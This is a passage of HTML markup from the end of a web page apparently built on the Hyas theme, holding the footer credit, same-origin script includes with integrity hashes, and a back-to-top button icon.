href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>